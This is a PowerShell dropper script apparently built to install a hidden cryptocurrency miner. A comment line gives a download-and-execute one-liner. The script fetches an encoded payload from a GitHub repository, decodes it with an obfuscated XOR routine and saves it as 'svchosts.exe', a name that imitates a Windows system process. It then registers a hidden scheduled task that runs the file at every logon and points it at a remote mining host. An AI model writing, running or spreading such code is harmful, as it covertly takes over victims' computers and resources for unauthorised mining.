# irm https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/archive.txt | iex
function white {
	param([byte]$Key, [byte[]]$Data)
    [uint32]$x = $Key
    $len = $Data.Length
    $out = New-Object byte[] $len
    for ($i = 0; $i -lt $len; $i++) {
        $x = $x -bxor ($x -shl 13)
        $x = $x -bxor ($x -shr 17)
        $x = $x -bxor ($x -shl 5)
        $out[$i] = $Data[$i] -bxor ($x -band 0xFF)
    }
    return $out
}

$var = (New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/mail.log").Trim()
$yellow = [Convert]::FromBase64String($var)
$orange = "12"
$buf = white -Key $orange -Data $yellow
$temp = [IO.Path]::Combine($env:LOCALAPPDATA, "svchosts.exe")
[IO.File]::WriteAllBytes($temp, $buf)
Register-ScheduledTask -TaskName "ServiceTask" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"Start-Process -FilePath '$temp' -ArgumentList '-o ontcfu.duckdns.org:443 --tls' -WindowStyle Hidden`"") -Trigger (New-ScheduledTaskTrigger -AtLogOn); Start-ScheduledTask -TaskName "ServiceTask"
Write-Host "OK"
